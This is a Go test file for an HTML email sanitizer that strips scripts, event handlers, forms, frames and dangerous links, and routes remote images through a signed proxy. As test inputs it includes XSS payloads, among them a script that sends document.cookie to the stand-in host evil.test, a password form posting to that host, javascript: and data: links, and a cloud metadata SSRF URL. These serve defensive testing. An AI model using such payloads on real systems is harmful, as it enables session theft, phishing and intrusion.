package sanitize

import (
	"net/url"
	"strings"
	"testing"
)

func testSanitizer() *Sanitizer { return New([]byte("a-test-image-proxy-signing-key-32")) }

// mustNotContain fails when any of the fragments survives sanitizing. Each one
// is a way HTML email has actually been used to attack a reader.
func mustNotContain(t *testing.T, got string, fragments ...string) {
	t.Helper()
	lower := strings.ToLower(got)
	for _, fragment := range fragments {
		if strings.Contains(lower, strings.ToLower(fragment)) {
			t.Errorf("sanitized output still contains %q:\n%s", fragment, got)
		}
	}
}

func TestScriptsAreRemoved(t *testing.T) {
	s := testSanitizer()
	got := string(s.HTML([]byte(`
		<p>hello</p>
		<script>fetch('https://evil.test/'+document.cookie)</script>
		<SCRIPT SRC="https://evil.test/x.js"></SCRIPT>
	`)))
	mustNotContain(t, got, "<script", "fetch(", "evil.test")
	if !strings.Contains(got, "hello") {
		t.Fatalf("the legitimate content was removed: %q", got)
	}
}

func TestEventHandlersAreRemoved(t *testing.T) {
	s := testSanitizer()
	got := string(s.HTML([]byte(`
		<div onclick="steal()" onmouseover="steal()" onerror="steal()">text</div>
		<img src="https://example.test/a.png" onerror="steal()">
		<body onload="steal()">
	`)))
	mustNotContain(t, got, "onclick", "onmouseover", "onerror", "onload", "steal()")
}

func TestFormsAndFramesAreRemoved(t *testing.T) {
	s := testSanitizer()
	got := string(s.HTML([]byte(`
		<form action="https://evil.test/collect" method="post">
			<input name="password" type="password">
			<button>Sign in</button>
		</form>
		<iframe src="https://evil.test/"></iframe>
		<object data="https://evil.test/"></object>
		<embed src="https://evil.test/">
		<base href="https://evil.test/">
		<meta http-equiv="refresh" content="0;url=https://evil.test/">
	`)))
	mustNotContain(t, got, "<form", "<input", "<iframe", "<object", "<embed", "<base", "http-equiv", "evil.test")
}

func TestDangerousURLSchemesAreRemoved(t *testing.T) {
	s := testSanitizer()
	got := string(s.HTML([]byte(`
		<a href="javascript:alert(1)">click</a>
		<a href="JaVaScRiPt:alert(1)">click</a>
		<a href="data:text/html;base64,PHNjcmlwdD4=">click</a>
		<a href="vbscript:msgbox(1)">click</a>
	`)))
	mustNotContain(t, got, "javascript:", "vbscript:", "data:text/html")
}

func TestSafeLinksSurviveAndOpenSafely(t *testing.T) {
	s := testSanitizer()
	got := string(s.HTML([]byte(`<a href="https://example.test/verify?token=abc">Verify</a>`)))

	if !strings.Contains(got, "https://example.test/verify?token=abc") {
		t.Fatalf("the link was removed: %q", got)
	}
	if !strings.Contains(got, `target="_blank"`) {
		t.Fatalf("links should open in a new tab: %q", got)
	}
	// A message body gets quoted and forwarded, so the markup has to be safe
	// standing alone, not only inside our sandboxed iframe.
	if !strings.Contains(got, "noopener") {
		t.Fatalf("a new tab link must not be able to reach its opener: %q", got)
	}
	if !strings.Contains(got, "noreferrer") {
		t.Fatalf("following a link should not report where the reader came from: %q", got)
	}
}

func TestRemoteImagesAreRewrittenToTheProxy(t *testing.T) {
	s := testSanitizer()
	const tracker = "https://tracker.test/open.gif?id=abc123"
	got := string(s.HTML([]byte(`<img src="` + tracker + `" width="1" height="1">`)))

	// Loading this directly would report the reader's address, user agent and
	// read time straight back to the sender.
	if strings.Contains(got, "tracker.test/open.gif") && !strings.Contains(got, ImageProxyPrefix) {
		t.Fatalf("the tracking pixel still loads directly: %q", got)
	}
	if !strings.Contains(got, ImageProxyPrefix) {
		t.Fatalf("the image was not proxied: %q", got)
	}

	// The proxy path carries a signature the proxy can check.
	proxied := extractSrc(t, got)
	signature, remote := splitProxyPath(t, proxied)
	if remote != tracker {
		t.Fatalf("proxy path points at %q, want %q", remote, tracker)
	}
	if !s.Verify(signature, remote) {
		t.Fatal("the proxy path signature does not verify")
	}
}

func TestProtocolRelativeImagesAreProxied(t *testing.T) {
	s := testSanitizer()
	got := string(s.HTML([]byte(`<img src="//tracker.test/open.gif">`)))
	if !strings.Contains(got, ImageProxyPrefix) {
		t.Fatalf("a protocol relative image was not proxied: %q", got)
	}
}

func TestSrcsetIsRemoved(t *testing.T) {
	// srcset would let a remote image load through a back door, unproxied.
	s := testSanitizer()
	got := string(s.HTML([]byte(
		`<img src="https://tracker.test/a.png" srcset="https://tracker.test/2x.png 2x">`)))
	mustNotContain(t, got, "srcset", "tracker.test/2x.png")
}

func TestInlineAndDataImagesAreLeftAlone(t *testing.T) {
	// Neither reaches the network, so neither needs proxying.
	s := testSanitizer()
	got := string(s.HTML([]byte(`<img src="cid:logo@example.test">`)))
	if !strings.Contains(got, "cid:logo@example.test") {
		t.Fatalf("an inline attachment reference was rewritten or dropped: %q", got)
	}
}

func TestSafeStylingSurvivesButDangerousStylingDoesNot(t *testing.T) {
	s := testSanitizer()
	// The cell is inside a table: parsing normalises HTML the way a browser
	// does, and a stray td outside one is dropped before sanitizing ever runs.
	got := string(s.HTML([]byte(`
		<table><tr><td style="background-color:#ff0000;padding:12px;font-size:14px">cell</td></tr></table>
		<div style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">overlay</div>
		<div style="background-image:url('https://tracker.test/x.png')">tracked</div>
	`)))

	// Email does its layout in inline styles, so stripping them all would
	// leave every message looking broken.
	if !strings.Contains(got, "background-color") || !strings.Contains(got, "padding") {
		t.Fatalf("safe styling was stripped: %q", got)
	}
	// These can cover the surrounding page or fetch a remote resource.
	mustNotContain(t, got, "position:fixed", "z-index", "tracker.test")
}

func TestTableLayoutSurvives(t *testing.T) {
	s := testSanitizer()
	got := string(s.HTML([]byte(
		`<table cellpadding="0" cellspacing="0" width="600"><tr><td align="center">body</td></tr></table>`)))
	for _, want := range []string{"<table", "<td", "cellpadding", "align"} {
		if !strings.Contains(got, want) {
			t.Fatalf("table layout lost %q: %q", want, got)
		}
	}
}

func TestMalformedMarkupDoesNotPanicAndIsStillSanitized(t *testing.T) {
	s := testSanitizer()
	hostile := []string{
		`<div><p>unclosed`,
		`<<script>script>alert(1)<</script>/script>`,
		`<img src=x onerror=alert(1)>`,
		`<svg><script>alert(1)</script></svg>`,
		`<math><mtext><script>alert(1)</script></mtext></math>`,
		`<div style="width:expression(alert(1))">x</div>`,
		`<a href="  javascript:alert(1)">x</a>`,
		strings.Repeat("<div>", 500) + "deep" + strings.Repeat("</div>", 500),
		"",
	}
	for _, input := range hostile {
		got := string(s.HTML([]byte(input)))
		mustNotContain(t, got, "<script", "onerror", "javascript:", "expression(")
	}
}

func TestSignatureIsBoundToTheURL(t *testing.T) {
	s := testSanitizer()
	signature := s.Sign("https://example.test/a.png")

	if !s.Verify(signature, "https://example.test/a.png") {
		t.Fatal("a valid signature did not verify")
	}
	// Without this, the proxy would fetch whatever anyone asked it to, from
	// inside the network.
	if s.Verify(signature, "https://169.254.169.254/latest/meta-data/") {
		t.Fatal("a signature verified against a different url")
	}
	if s.Verify("", "https://example.test/a.png") {
		t.Fatal("an empty signature verified")
	}

	other := New([]byte("a-different-image-proxy-key-32by"))
	if other.Verify(signature, "https://example.test/a.png") {
		t.Fatal("a signature from one key verified under another")
	}
}

func extractSrc(t *testing.T, doc string) string {
	t.Helper()
	const marker = `src="`
	i := strings.Index(doc, marker)
	if i < 0 {
		t.Fatalf("no src attribute in %q", doc)
	}
	rest := doc[i+len(marker):]
	j := strings.IndexByte(rest, '"')
	if j < 0 {
		t.Fatalf("unterminated src attribute in %q", doc)
	}
	unescaped := strings.NewReplacer("&amp;", "&", "&#34;", `"`).Replace(rest[:j])
	return unescaped
}

func splitProxyPath(t *testing.T, path string) (signature, remote string) {
	t.Helper()
	trimmed := strings.TrimPrefix(path, ImageProxyPrefix)
	parts := strings.SplitN(trimmed, "?u=", 2)
	if len(parts) != 2 {
		t.Fatalf("proxy path %q has no url", path)
	}
	decoded, err := url.QueryUnescape(parts[1])
	if err != nil {
		t.Fatalf("proxy path url does not decode: %v", err)
	}
	return parts[0], decoded
}
